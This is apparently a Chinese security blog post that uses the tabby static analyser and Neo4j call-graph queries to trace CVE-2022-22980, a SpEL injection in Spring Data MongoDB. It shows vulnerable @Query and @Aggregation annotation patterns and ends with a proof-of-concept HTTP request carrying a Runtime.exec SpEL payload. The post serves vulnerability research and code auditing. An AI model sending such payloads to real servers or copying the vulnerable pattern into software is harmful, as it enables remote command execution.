
## 使用 tabby 分析 Spring Data MongoDB SpEL 漏洞

- - -

最近学习了一款非常优秀的 Java 语言静态代码分析工具：[tabby](https://github.com/wh1t3p1g/tabby)。正好近期出了个 Spring Data MongoDB 的 SpEL 表达式注入。便想着使用 tabby 对这个组件进行分析，一来熟悉熟悉 tabby 的使用，二来想感受一下这款静态代码分析工具对于代码审计的助力。

# [环境搭建](#toc_)

## [安装 tabby](#toc_tabby)

地址：[https://github.com/wh1t3p1g/tabby](https://github.com/wh1t3p1g/tabby)

JDK 版本最好选择 8u292 及以上，[wh1t3p1g 师傅的 JDK 版本是 8u292，版本过低会导致一些问题](https://github.com/wh1t3p1g/tabby/issues/20)。但鉴于 Oracle 提供的 JDK 似乎没有 8u292，我们可以使用 8u291 代替。

注意不要下 releaase。release 是老版本，有些小 Bug 作者暂时没修，只在 master 分支上更新了。所以我们应当`git clone`下来手动打 Jar 包。

Tabby 使用的是 gradle 管理工程。项目中带了一个`gradlew`文件，我们直接用这个文件打包即可

```plain
.\gradlew tasks  #查看 gradle 支持的命令
.\gradlew clean  #先 clean，再打包，好习惯
.\gradlew bootJar
```

编译好的文件在`build/libs`下。此时还不能直接用。我们需要将项目根目录的`/config`和`/rules`文件夹拷贝过来。并修改`/config/settings.properties`配置

```plain
# build code property graph
tabby.build.enable                    = true
# jdk settings
# isJDKProcess 最好是 true，不然会报 soot 的 basic class 的错误
tabby.build.isJDKProcess              = true 
tabby.build.withAllJDK                = false
tabby.build.excludeJDK                = false
tabby.build.isJDKOnly                 = false

# dealing fatjar
tabby.build.checkFatJar               = true

# default pointed-to analysis
tabby.build.isFullCallGraphCreate     = true

# 扫描的 Jar 包目录路径
tabby.build.target                    = jars/
tabby.build.libraries                 = jars/

# 将函数属性图导入 Neo4j 中
tabby.load.enable                     = true

# 开启 debug
tabby.debug.details                   = true
tabby.debug.inner.details             = true
```

创建一个名为`jars`的目录，用于存放要扫描的 jar 包。

随后需要安装 Neo4j，Neo4j 的配置和安装，可以直接参考[wh1t3p1g 师傅的指南](https://github.com/wh1t3p1g/tabby/wiki/Neo4j%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE)。

安装 Neo4j 完毕并启动好数据库后，我们先暂时放置，下文会说如何使用 tabby。

## [安装 MongoDB](#toc_mongodb)

从[官网中扒拉](https://www.mongodb.com/try/download/community)，建议下载 zip 版本的，能绿色装就绿色装。

解压出来后有几个关键文件： \* `mongod` - mongoDB 服务端 \* `mongo` - mongoDB 客户端

下载 zip 下来的 MongoDB 没有配置文件，需要自己手动写一个。

*mongod.cfg*

```plain
#日志
systemLog:
 destination: file
 path: D:\env\mongodb-windows-x86_64-5.0.9\mongodb-win32-x86_64-windows-5.0.9\bin\mongod.log
#数据库文件位置
storage:
 dbPath: D:\env\mongodb-windows-x86_64-5.0.9\mongodb-win32-x86_64-windows-5.0.9\bin\mydb
#服务端口
net:
 bindIp: 127.0.0.1
 port: 12345
```

启动服务时的命令为

```plain
mongod.exe --config mongod.cfg
```

客户端连接

```plain
mongo.exe --port 12345
```

基本命令是可以用`help`列出来的。这里需要注意一点，就是 MongoDB 执行 SQL 语句的时候，需要先`use`到对应的数据库才能执行语句。如下文执行用户相关的操作，需要先`use admin`。

创建用户（只要数据库不存在，MongoDB 就会自动创建）

```plain
use admin
db.createUser({user: 'root', pwd: '123456', roles: [{role: 'root', db: 'admin'}, {role: '__system', 'db': 'admin'}]})
db.createUser({user: 'admin', pwd: '123456', roles: [{role: 'readWrite', db: 'myData'}]})
```

修改 MongoDB 配置文件，开启鉴权

```plain
#鉴权配置
security:
 authorization: enabled
```

重启 MongoDB，此时再用客户端不带用户名密码的连接，是无法查询任何数据的。并且`root`用户是超级管理员，可以正常`show dbs`等操作；而`admin`用户是数据库用户，只对`myData`表有读写权限。所以只能执行 IO 操作。

其他一些 mongoDB 的命令

```plain
#用户操作，查用户、创建用户、授权用户、删除用户
db.system.users.find().pretty()
db.system.users.find({“db”: “myData”}).pretty()
db.createUser({user: 'admin', pwd: '123456', roles: [{role: 'readWrite', db: 'myData'}]})
db.grantRolesToUser('root', [{role: '__system', 'db': 'admin'}])
db.dropUser({user: 'root'})

#数据库操作，插入、查询
db.demo.insertOne({name: "pp"})
db.demo.find().pretty()
```

## [Spring Data MongoDB](#toc_spring-data-mongodb)

用三梦师傅给的环境来学习 [https://github.com/threedr3am/learnjavabug/tree/master/spring/spring-data-mongodb-spel-CVE-2022-22980](https://github.com/threedr3am/learnjavabug/tree/master/spring/spring-data-mongodb-spel-CVE-2022-22980)

注意，如果配置了 MongoDB 的用户，开启了鉴权。需要修改`application.yml`为如下配置。一定要加`authSource=admin`！！！当然若 MongoDB 没配置鉴权，保持原样就行。

```plain
spring:
  data:
    mongodb:
      uri: mongodb://admin2:123456@127.0.0.1:12345/myData?authSource=admin
```

然后看到`com.threedr3am.bug.spring.data.mongodb.repository.DemoRepository`。这里三梦师傅已经给了我们两个 Poc 了。但这个 Poc 为什么要这么构造呢？这个问题就需要下文的分析了。

# [漏洞复现](#toc__1)

首先看到通告：[https://tanzu.vmware.com/security/cve-2022-22980](https://tanzu.vmware.com/security/cve-2022-22980)。光看描述我们就可以大致知道，漏洞点出在`@Query`和`@Aggregation`注解上。**如果用户输入直接传给注解，注解中存在 SpEL 占位符就会触发这个漏洞。**

那这两个注解`@Query`和`@Aggregation`是什么呢？但从字面义上可以猜测这是查询注解和聚合注解。需要我们翻阅文档查看了。在文档[15.2. Query Methods](https://docs.spring.io/spring-data/mongodb/docs/current/reference/html/#mongodb.repositories.queries.json-based)和文档[15.2.10. Aggregation Repository Methods](https://docs.spring.io/spring-data/mongodb/docs/current/reference/html/#mongodb.repositories.queries.aggregation)章节中可以了解到他们的作用：`@Query`是基于 JSON 格式的查询，以 JSON 数据作匹配；而`@Aggregation`是聚合查询，聚合查询就是支持多种操作的查询语句，如 group by、统计等等。

有意思的是，在官方文档中，已经说明了`@Query`和`@Aggregation`是支持 SpEL 表达式的。并且可以用占位符的方式，将函数传参传递到语句中。  
[![4.png](assets/1698894237-f6aa3de9a06175f55d5c867a071b7310.png)](https://storage.tttang.com/media/attachment/2022/07/04/e575796f-d930-4e30-86e6-912813522f46.png)

[![5.png](assets/1698894237-7ab92bd1d6462cb993ad453eeb401290.png)](https://storage.tttang.com/media/attachment/2022/07/04/662f62bc-dbb7-45ab-9489-3f628c5b3045.png)

似乎漏洞看文档就出来了。只需要在注解上加`?#{[0]}`，就能让参数传递到 SpEL 表达式中。

尝试在我们复现代码中加上

*com.threedr3am.bug.spring.data.mongodb.repository.DemoRepository*

```plain
.....
@Query("{id: ?#{[0]}}")
List<Demo> myQuery1(String keyword);
```

*com.threedr3am.bug.spring.data.mongodb.controller.DemoController*

```plain
@RequestMapping(value = "/demo1")
public List<?> demo1(@RequestParam(name = "keyword") String keyword) {
    return demoRepository.myQuery1(keyword);
}
```

这两个函数的意图很明显，控制器将 Request 得到的参数`keyword`传递给`DemoRepository.myQuery1()`，再通过占位符传递给 Query 语句。

构造 Request 请求：

```plain
POST /demo1 HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

keyword=T(java.lang.String).forName(%22java.lang.Runtime%22).getRuntime().exec(%22calc%22)
```

可惜并如我们所愿的执行到 SpEL 解析，他什么也没有返回，没弹计算器也没报错。而测试三梦师傅给的 Poc，确确实实是能弹计算器的。这会该如何调试呢？我的思路是：要么继续翻文档看看有没有其他的 SpEL 使用方式；要么尝试找到`@Query`注解的内部实现，用 tabby 工具帮助我们找到从`@Query`注解到 SpelExpressionParser 的通路。下文将阐述用 tabby 查询找到通路的过程。

## [tabby 生成代码属性图](#toc_tabby_1)

要使用 tabby，首先需要导出项目所有 Jar 包。在 IDEA 中，可以通过"File -> Project Structure -> Project Settings -> Artifacts"中添加一个 Artifact，将项目打包出来，这样便能顺利导出所有项目相关的 jar 包以供 tabby 分析。  
[![6.png](assets/1698894237-d0e6da5c0647ff2be22ff23a6ca0faea.png)](https://storage.tttang.com/media/attachment/2022/07/04/16c052a2-434d-4453-9757-24b28a8c7026.png)

随后运行"Build -> Build Artifacts -> Rebuild"即可导出到`/out`目录中。随后我们将这些 jar 包全放到上文”安装 tabby“一节中，创建的`jars`目录下。在运行最好将`/cache`目录下的文件删除。随后运行命令

```plain
java -Xmx6g -jar tabby-1.1.1.RELEASE.jar
```

tabby 运行完毕后，代码属性图将会存储到 Neo4j 中。此时我们可以尝试在 Neo4j 中运行命令`:sysinfo`，将能看到数据库的存储信息。  
[![7.png](assets/1698894237-ce02a322af49a68bdcee58777db4280a.png)](https://storage.tttang.com/media/attachment/2022/07/04/78cd76df-7ae9-4fc9-bf24-b274f3fdbb4c.png)

代码属性图有了，接下来我们要如何查询呢？我们需要理解下[wh1t3p1g 师傅给出的查询模板](https://blog.0kami.cn/2021/03/14/java-how-to-find-gadget-chains/)

## [Neo4j 查询](#toc_neo4j)

Neo4j 是一个图数据库，需要先明白如下几点：

-   Neo4j 用的是 CQL 查询语言的图数据库，和 MySQL 这些使用 SQL 查询语言的关系型数据库语法不一样。但是思路还是一样的，无非是 数据查询 + 条件筛选
-   关系型数据库存放的数据是按行和列查询，而图数据库是用节点和关系边进行查询。
-   在代码分析中，有两个关键术语：Source 和 Sink。Source 是输入，即用户可控部分；Sink 是汇聚点，即危险代码。Tabby 的思路是：通过 Neo4j 图数据库的节点和关系边，将每个方法之间的调用链用 Neo4j 的关系边串联起来。我们便可查询 Source 到 Sink 之间的调用路径。

**教程**：[https://www.w3cschool.cn/neo4j/](https://www.w3cschool.cn/neo4j/)  
**wh1t3p1g 师傅的例子**：[https://blog.0kami.cn/2021/03/14/java-how-to-find-gadget-chains/](https://blog.0kami.cn/2021/03/14/java-how-to-find-gadget-chains/)

- - -

基本命令，查询数据库状态和数据库结构

```plain
:sysinfo
:schema
```

[按照给的**模板**](https://blog.0kami.cn/2021/03/14/java-how-to-find-gadget-chains/)

```plain
match (source:Method {NAME:"execute"})
match (sink:Method {IS_SINK:true, NAME:"getInstance"})<-[:CALL]-(m1:Method)
call apoc.algo.allSimplePaths(m1, source, "<CALL|ALIAS", 20) yield path 
return * limit 20
```

其中，`match()`表示匹配匹配哪些节点。类似于 SQL 中的 select。在`match (source:Method {NAME:"execute"})`这一句中，`source`是别名，`Method`是节点类型，`{NAME:"execute"}`是匹配的节点内容。这些数据来自于 Tabby 生成的 csv 文件。节点数据一般都是类 JSON 格式的。在 Tabby 中有两个重要的节点类型：`Method`和`Class`。

注：理论上来说，查询`match (source:Method) return *`就是返回全图类调用，但肯定会很卡 233。

查询所有方法名为`execute`的语句：`match (source:Method {NAME:"execute"}) return *`。可以得出下图的结果。点击一个节点，会显示该节点的全部信息，我们可以根据这里的信息再进行查询。`Method`节点中有个`IS_SINK`和`IS_SOURCE`，这两个属性需要在 Tabby 的配置文件`/rules/knowledges.json`中配置，可以方便我们查询 Source 和 Sink  
[![tabby_5.png](assets/1698894237-6dac600115a6b5b8734caf4c6ae90a90.png)](https://storage.tttang.com/media/attachment/2022/07/04/462ee29d-b8c2-4868-bfaa-a74f13a16c4f.png)

Neo4j 图数据库还有一个可查询的数据：关系边，也就是上文模板中`match (sink:Method {IS_SINK:true, NAME:"getInstance"})<-[:CALL]-(m1:Method)`这一句。同样是`match()`方法，只不过后面多了`<-[:CALL]-(m1:Method)`。这个是 Neo4j 中关系查询的语法。

Neo4j 中有三种指向：`() - [] -> ()`、`() <- [] - ()`和`() - [] - ()`。顾名思义，前两种就是看箭头方向表示对应的单项关系；最后一种表示双向关系。

左右两边表示**查询的节点**，在该例中，左边`(sink:Method {IS_SINK:true, NAME:"getInstance"})`就是把方法名为`getInstance`、并且预设规则匹配是 SINK 的节点查出来；右边`(m1:Method)`表示查询所有的方法；中间表示**关系**。这里的关系是`[:CALL]`调用关系；箭头方向是`() <- [] - ()`，表示节点的指向是从右到左；全部结合起来看就是：**在所有方法中，筛选`getInstance`方法的调用者**。

模板第三句是`call apoc.algo.allSimplePaths(m1, source, "<CALL|ALIAS", 20) yield path`。这是调用了之前给 Neo4j 安装的插件`apoc`。`apoc.algo.allSimplePaths`语法是：

```plain
apoc.algo.allSimplePaths(startNode :: NODE?, endNode :: NODE?, relationshipTypesAndDirections :: STRING?, maxNodes :: INTEGER?) :: (path :: PATH?)
```

该函数的主要作用是返回`startNode`到`endNode`之间的关系路径。该函数有四个输入参数：

-   `startNode` - 开始节点，也就是 Source
-   `endNode` - 结束节点，也就是 Sink
-   `relationshipTypesAndDirections` - Neo4j 的关系边，类型是字符串，可以设置为多个关系。查询时会按照这个关系进行路径图的查找
-   `maxNodes` - 搜索的最大节点数，也就是路径深度。注意千万不能设太大，尤其是节点很多的时候。

同时还有一个输出参数：

-   `path` - 没看到文档有特别说明 233，看到[文档](https://neo4j.com/labs/apoc/4.0/algorithms/path-finding-procedures/)中给的都是`YIELD path, weight`。拿就照着[文档](https://neo4j.com/labs/apoc/4.0/algorithms/path-finding-procedures/)来吧

了解完每个语句的功能后，再看回模板可以知道：该模板将方法名为`execute`的节点作为 Source；将调用方法名为`getInstance`、且在`/rules/knowledges.json`设置过规则的节点**调用者**设置为 Sink；最后调用`allSimplePaths`搜索关系边为`CALL`和`ALIAS`的调用路径，返回 20 个结果。

```plain
match (source:Method {NAME:"execute"})
match (sink:Method {IS_SINK:true, NAME:"getInstance"})<-[:CALL]-(m1:Method)
call apoc.algo.allSimplePaths(m1, source, "<CALL|ALIAS", 20) yield path 
return * limit 20
```

但这个查询语句在我们的这个程序里是查不到东西的，因为没有这两个方法的通路。我们可以构造这样的查询语句：查看 Tomcat 中`doFilter()`到`service()`的通路情况。

```plain
match (source:Method {NAME:"doFilter"})
match (sink:Method {NAME:"service"})<-[:CALL]-(m1:Method)
call apoc.algo.allSimplePaths(m1, source, "<CALL|ALIAS", 20) yield path 
return * limit 20
```

[![tabby_9.png](assets/1698894237-15d3d486df205e80d6748518c02e316e.png)](https://storage.tttang.com/media/attachment/2022/07/04/d8db6717-778a-4b5c-a9d5-ba3f3fba84ac.png)

以上，只要按着模板构造查询语句，就能查询所有 Source to Sink 的调用图，对我来说够用了 233。

## [Source&Sink](#toc_sourcesink)

要找 Source，首先得确定`@Query`在哪被 Spring Data MongoDB 解析。Spring Data MongoDB 对注解查询的实现是使用对象代理，通过对象代理设置的 Interceptor 进行逻辑处理。而[tabby 目前是不支持对象代理查询的](https://github.com/wh1t3p1g/tabby/wiki/%E7%8E%B0%E6%9C%89%E5%88%A9%E7%94%A8%E9%93%BE%E8%A6%86%E7%9B%96)。经过搜索可知，逻辑处理的 Interceptor 为`QueryExecutorMethodInterceptor`。我们找到`org.springframework.data.repository.core.support.QueryExecutorMethodInterceptor#invoke`并下断点跟踪调试。

调试时可观察到程序走到了`org.springframework.data.mongodb.repository.query.AbstractMongoQuery#doExecute`中，顾名思义，这是一个处理 query 的类，该函数返回值是查询结果。由此我们可以断定，`@Query`在 Spring Data 的内部实现解析语句，执行查询的方法就是这个。也就是说，这个方法就是我们的 Source。

有没有可能漏洞点其实是在`AbstractMongoQuery#doExecute`之前，在对象代理的各个 invoke 中触发呢？如果我们将`AbstractMongoQuery#doExecute`定为 Source 会不会导致漏报呢？我们调试时可以看到，在`AbstractMongoQuery#doExecute`中有如下代码：

```plain
public abstract class AbstractMongoQuery implements RepositoryQuery {
    protected Object doExecute(
            MongoQueryMethod method, 
            ResultProcessor processor, 
            ConvertingParameterAccessor accessor,
            @Nullable Class<?> typeToRead) {

        Query query = createQuery(accessor);//
        ......
    }
    .....
}
```

这其中，`accessor`参数存放的是注解方法的函数形参。在本例中就是`List<Demo> myQuery1(String keyword);`的`keyword`值；`AbstractMongoQuery`类的`query`属性就存放着`@Query`中的值。在`createQuery()`中，会将`accessor`和`query`关联起来，完成参数绑定。在`createQuery()`之前，暂时没看到有其他函数对`accessor`执行过操作。所以触发点在`AbstractMongoQuery#doExecute`之前的可能性较小。

接下来的 Sink 就简单了，SpEL 表达式注入的 Sink 往往都是`parseExpression()`方法。考虑到有可能存在抽象类、父类和接口实现的情况，我们只将这个方法当作 Sink 即可。

最终构造出来的 Neo4j 查询语句为

```plain
//Source 是 AbstractMongoQuery#doExecute
match(source:Method{CLASSNAME:"org.springframework.data.mongodb.repository.query.AbstractMongoQuery", NAME:"doExecute"})
//Sink 是 parseExpression 方法
match((sink:Method{NAME:"parseExpression"}) <- [:CALL|ALIAS] - (m:Method))
//调用路径查询
call apoc.algo.allSimplePaths(m, source, "<CALL|ALIAS", 10) yield path 
return *
```

查询结果如下。我们可以很清晰的看到从 Source `doExecute`到 Sink `parseExpression`路径中，存在两条主要的路径：一是走`doFind()`方法后通过`toDocument()`到达 Sink；二是先走到`ParameterBindingJsonReader<init>`中，后通过`evaluate()`方法到达 Sink。  
[![8.png](assets/1698894237-dffa47a259092408afe9f15b23e1691e.png)](https://storage.tttang.com/media/attachment/2022/07/04/86c97386-f349-4fad-a4f1-20c7eb155c99.png)

看回`AbstractMongoQuery#doExecute`的代码：

```plain
protected Object doExecute(
        MongoQueryMethod method, 
        ResultProcessor processor, 
        ConvertingParameterAccessor accessor,
        @Nullable Class<?> typeToRead) {

    Query query = createQuery(accessor); //ParameterBindingJsonReader<init>通路

    applyQueryMetaAttributesWhenPresent(query); 
    query = applyAnnotatedDefaultSortIfPresent(query);
    query = applyAnnotatedCollationIfPresent(query, accessor); //ParameterBindingJsonReader<init>通路

    FindWithQuery<?> find = typeToRead == null
        ? executableFind //
        : executableFind.as(typeToRead);

    return getExecution(accessor, find).execute(query); //doFind通路
}
```

最先执行的`createQuery()`，也是上图中走`ParameterBindingJsonReader<init>`通路的，尝试调试并跟进。顺着代码属性图的调用链来调试，看看能否顺利走到 Sink，如果不能则需要查出具体的原因。

### [ParameterBindingJsonReader](#toc_parameterbindingjsonreader)

**尝试走`ParameterBindingJsonReader<init>`通路**，观察到其代码如下

```plain
public ParameterBindingJsonReader(String json, ParameterBindingContext bindingContext) {
    this.scanner = new JsonScanner(json);
    setContext(new Context(null, BsonContextType.TOP_LEVEL));

    this.bindingContext = bindingContext;

    //需要正则匹配才能调用到bindableValueFor()
    //正则规则为 ^\?(\d+)$
    Matcher matcher = PARAMETER_ONLY_BINDING_PATTERN.matcher(json);
    if (matcher.find()) {
        currentValue = bindableValueFor(new JsonToken(JsonTokenType.UNQUOTED_STRING, json)).getValue();
    }
}
```

而我们`@Query`中定义的查询 JSON 是`{id: ?#{[0]}}`，很明显不符合。要进入到这里，除非开发设置的 JSON 是`?0`之类的才行。那我们直接将 Demo 改成`?0`，调试跟进，发现只要到了`org.springframework.data.mongodb.util.json.ParameterBindingJsonReader#bindableValueFor`。就会开始解析 SpEL。接下来就是找从`AbstractMongoQuery#doExecute`出发，绕过`ParameterBindingJsonReader<init>`，走到`ParameterBindingJsonReader#bindableValueFor`的通路。

修改 Neo4j 查询语句。注意如果这个时候直接按**原来的查询语句**扩大搜索深度，虽然也能找到通路，但会很多很乱

```plain
match(source:Method{CLASSNAME:"org.springframework.data.mongodb.repository.query.AbstractMongoQuery", NAME:"doExecute"})
match((sink:Method{CLASSNAME:"org.springframework.data.mongodb.util.json.ParameterBindingJsonReader", NAME:"bindableValueFor"}) <- [:CALL|ALIAS] - (m:Method))
call apoc.algo.allSimplePaths(m, source, "<CALL|ALIAS",7) yield path 
return *
```

结果  
[![16.png](assets/1698894237-27d85bceeb512b3a9f3c47d0a0f2caef.png)](https://storage.tttang.com/media/attachment/2022/07/04/0aecfdda-5500-413c-9cd9-7eae5dc008da.png)

大体可以看到，只有`decode`和`readBsonType`这两路是独立于`ParameterBindingJsonReader<init>`的。重点关注这两路的函数调用。

### [StringBasedAggregation#doExecute](#toc_stringbasedaggregationdoexecute)

首先我们要思考一个问题：repository 的注解要如何配置，才能让程序走到这里呢？

根据该类名在官方手册中查找，发现有一个`@Aggregation`的注解。[翻阅 Aggregation 文档](https://docs.spring.io/spring-data/mongodb/docs/current/reference/html/#mongodb.repositories.queries.aggregation) 和 [SpEL 文档](https://docs.spring.io/spring-data/mongodb/docs/current/reference/html/#mongodb.repositories.queries.json-spel)可知，我们可以构造出这样的一个查询注解：

```plain
@Aggregation("{ '$project': { '_id' : #{[0]} } }") 
List<String> findById(String keyword);
```

Aggregation 是 MongoDB 的聚合函数。其中`$project`在 MongoDB 中的作用是指定返回的 fields。

重新更改查询注解后再次调试，可以发现程序经过如下调用栈后顺利来到`bindableValueFor()`中

```plain
bindableValueFor:389, ParameterBindingJsonReader (org.springframework.data.mongodb.util.json)
readBsonType:304, ParameterBindingJsonReader (org.springframework.data.mongodb.util.json)
decode:227, ParameterBindingDocumentCodec (org.springframework.data.mongodb.util.json)
decode:66, ParameterBindingDocumentCodec (org.springframework.data.mongodb.util.json)
readValue:360, ParameterBindingDocumentCodec (org.springframework.data.mongodb.util.json)
decode:229, ParameterBindingDocumentCodec (org.springframework.data.mongodb.util.json)
captureExpressionDependencies:202, ParameterBindingDocumentCodec (org.springframework.data.mongodb.util.json)
computePipelineStage:189, StringBasedAggregation (org.springframework.data.mongodb.repository.query)
computePipeline:181, StringBasedAggregation (org.springframework.data.mongodb.repository.query)
doExecute:97, StringBasedAggregation (org.springframework.data.mongodb.repository.query)
execute:107, AbstractMongoQuery (org.springframework.data.mongodb.repository.query)
```

### [StringBasedMongoQuery#createQuery](#toc_stringbasedmongoquerycreatequery)

按照类名可以猜测，这个应该是`@Query`注解会调用的函数。构造查询注解：

```plain
@Query("{id : ?#{[0]}}")
Slice findById(String keyword
```

重新更改查询注解后再次调试，可以发现程序经过如下调用栈后顺利来到`bindableValueFor()`中

```plain
bindableValueFor:389, ParameterBindingJsonReader (org.springframework.data.mongodb.util.json)
readBsonType:304, ParameterBindingJsonReader (org.springframework.data.mongodb.util.json)
decode:227, ParameterBindingDocumentCodec (org.springframework.data.mongodb.util.json)
decode:180, ParameterBindingDocumentCodec (org.springframework.data.mongodb.util.json)
createQuery:121, StringBasedMongoQuery (org.springframework.data.mongodb.repository.query)
doExecute:122, AbstractMongoQuery (org.springframework.data.mongodb.repository.query)
execute:107, AbstractMongoQuery (org.springframework.data.mongodb.repository.query)
```

### [AbstractMongoQuery#applyAnnotatedCollationIfPresent](#toc_abstractmongoqueryapplyannotatedcollationifpresent)

该函数和上面`createQuery()`于同一个函数触发的，不深究。

### [size](#toc_size)

不可行。究其原因是因为只有`LazyBSONList`的`size()`才是 gadget。而实际调用的是普通的`List`，无法触发。

## [bindableValueFor()](#toc_bindablevaluefor)

通过上文的调试，发现有两条通路`StringBasedAggregation#doExecute`和`StringBasedMongoQuery#createQuery`可以来到`bindableValueFor()`。

在`bindableValueFor()`中的主要工作是让程序走到`evaluateExpression()`中。`evaluateExpression()`函数会一路调用到 Sink 点`parseExpression()`，`bindableValueFor()`代码如下：

```plain
//入参就是在 repository 中注解的查询 JSON
private BindableValue bindableValueFor(JsonToken token) {
    //JSON 是未闭合的字符串
    if (token.getType().equals(JsonTokenType.UNQUOTED_STRING)) {
        //正则 [\?:]#\{.*\}。需要形如 ?#{xxx} 或者 :#{xxx}
        Matcher regexMatcher = EXPRESSION_BINDING_PATTERN.matcher(tokenValue);
        if (regexMatcher.find()) {
            String binding = regexMatcher.group();
            String expression = binding.substring(3, binding.length() - 1);
            //正则 \?(\d+)。形如 ?0
            Matcher inSpelMatcher = PARAMETER_BINDING_PATTERN.matcher(expression);
            while (inSpelMatcher.find()) {
                int index = computeParameterIndex(inSpelMatcher.group());
                //将表达式中形如？0 替换成真实值
                expression = expression.replace(inSpelMatcher.group(), getBindableValueForIndex(index).toString());
            }

            //【！】执行SpEL解析
            Object value = evaluateExpression(expression);
        }
    }
    ......
}
```

由于程序是先解析`?#{}`，再解析`?0`。所以我们是没法通过外部传参注入`#{}`，并使之解析 SpEL 的，需要依靠开发者手动写了`#{}`。

构造查询注解：

```plain
@Query("{id : ?#{?0}}")
Slice findById(String keyword)
```

重新更改查询注解后再次调试，可以发现最后传入`evaluateExpression()`中的`expression`已经是外部 Request 可控的了。此时继续跟进`evaluateExpression()`。会发现其实最终调用的`parseExpression()`是`CachingExpressionParser#parseExpression`。它只有一行代码：返回`org.springframework.expression.spel.standard.SpelExpressionParser#parseExpression`

[![17.png](assets/1698894237-b7d7877fa156c1cd0304bb3649de0b4f.png)](https://storage.tttang.com/media/attachment/2022/07/04/b2ce0f42-35ab-4bea-9575-68c774a11980.png)

`parseExpression`只是解析了表达式，还需要调用`getValue()`才是真正执行表达式的代码。而`getValue()`在`CachingExpressionParser#parseExpression`的上一层`DefaultSpELExpressionEvaluator#evaluate`存在调用

```plain
public <T> T evaluate(String expression) {
    return (T) parser.parseExpression(expression).getValue(context, Object.class);
}
```

## [POC](#toc_poc)

结合前文`StringBasedMongoQuery#createQuery`和`StringBasedAggregation#doExecute`的两条 chain 可以得知，我们需要在程序的 repository 打上形如这样的注解：

```plain
@Query("{id : ?#{?0}}")
@Query("{id : :#{?0}}")
@Aggregation("{ '$project': { '_id' : ?#{?0} } }")
@Aggregation("{ '$project': { '_id' : :#{?0} } }")
```

Controller 将 Request 传参直接传入 repository 注解中

```plain
@RequestMapping(value = "/demo1")
public List<?> demo1(@RequestParam(name = "keyword") String keyword) {
    return demoRepository.findById1(keyword);
}
```

直接发送如下请求，即造成 SpEL 注入。

```plain
POST /demo4 HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

keyword=T(java.lang.String).forName(%22java.lang.Runtime%22).getRuntime().exec(%22calc%22)
```

至此，从注解出发到`parseExpression`的 gadgets 就走完了。可见使用 tabby 生成代码属性图，能让我们很方便的识别所有的 chain，并且也方便我们一一查看，并判断 chain 的可行性。在审计中，通过阅读代码思考 Source 和 Sink 的位置，结合手册进行理解，并通过 tabby 自动化地帮助我们找 chain 和 gadgets，可以达到事半功倍的效果。

# [Reference](#toc_reference)

tabby 项目地址：[https://github.com/wh1t3p1g/tabby](https://github.com/wh1t3p1g/tabby)  
三梦师傅提供的环境：[https://github.com/threedr3am/learnjavabug/tree/master/spring/spring-data-mongodb-spel-CVE-2022-22980](https://github.com/threedr3am/learnjavabug/tree/master/spring/spring-data-mongodb-spel-CVE-2022-22980)  
[https://tanzu.vmware.com/security/cve-2022-22980](https://tanzu.vmware.com/security/cve-2022-22980)  
[https://docs.spring.io/spring-data/mongodb/docs/current/reference/html/#mongo.core](https://docs.spring.io/spring-data/mongodb/docs/current/reference/html/#mongo.core)  
[https://stackoverflow.com/questions/38509882/how-are-spring-data-repositories-actually-implemented](https://stackoverflow.com/questions/38509882/how-are-spring-data-repositories-actually-implemented)
